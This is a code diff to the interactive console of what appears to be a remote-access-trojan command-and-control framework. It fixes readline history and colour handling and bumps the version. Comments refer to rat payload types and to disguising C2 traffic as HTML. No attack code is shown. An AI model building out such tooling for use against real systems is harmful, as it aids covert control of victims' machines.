@@ -154,7 +154,6 @@ readline.set_completer_delims(' \t\n;')
 readline.parse_and_bind("tab: complete")
 readline.set_completer(comp.complete)
 
-
 def pretty_print_banner():
     banner = """
     $$\                       $$\                       $$\                             _
@@ -164,18 +163,9 @@ def pretty_print_banner():
     $$ |  $$ | $$$$$$$ |$$ /  $$ |$$ |  \__| $$$$$$$ |  $$ |    \$$$$$$\        (    / _/    /' o O| ,_( ))___     (`
     $$ |  $$ |$$  __$$ |$$ |  $$ |$$ |      $$  __$$ |  $$ |$$\  \____$$\        ` -|   )_  /o_O_'_(  \\'    _ `\    )
     $$$$$$$  |\$$$$$$$ |\$$$$$$$ |$$ |      \$$$$$$$ |  \$$$$  |$$$$$$$  |          `"\"\"\"`            =`---<___/---'
-    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.9 DPI Aware CSharp Screens "`
+    \_______/  \_______| \_______|\__|       \_______|   \____/ \_______/  v1.6.10 fixed readline history  "`
     """
     pretty_print(banner)
-
-# Required function for interactive history
-def history(numlines=-1):
-    total = readline.get_current_history_length()
-    if(numlines == -1):
-        numlines = total
-    if(numlines > 0):
-        for i in range(total - numlines, total):
-            pretty_print(readline.get_history_item(i + 1))
 
 # Wrap C2 comms in html and html2 code to make requests look more legitimate
 def htmlify(data):
@@ -189,14 +179,16 @@ def htmlify(data):
 
 # Print colors according to the rat type
 def colors(value):
-    BOLD = '\033[1m'
-    ENDC = '\033[0m'
-    UNDERLINE = '\033[4m'
-    c = '\033[91m'    # Red
-    cs = '\033[92m'   # Green
-    js = '\033[93m'   # Yellow
-    ps1 = '\033[94m'  # Blue
-    hta = '\033[95m'  # Purple
+    # ANSI color codes need to be wrapped with readline "invisible characters" (start: \001 end: \002)
+    # so they don't count as characters for readline history: https://stackoverflow.com/a/55773513
+    BOLD = '\001\033[1m\002'
+    ENDC = '\001\033[0m\002'
+    UNDERLINE = '\001\033[4m\002'
+    c = '\001\033[91m\002'    # Red
+    cs = '\001\033[92m\002'   # Green
+    js = '\001\033[93m\002'   # Yellow
+    ps1 = '\001\033[94m\002'  # Blue
+    hta = '\001\033[95m\002'  # Purple
     colors = {"c":c, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
     if(value in colors.keys()):
         return(colors[value] + value + ENDC)
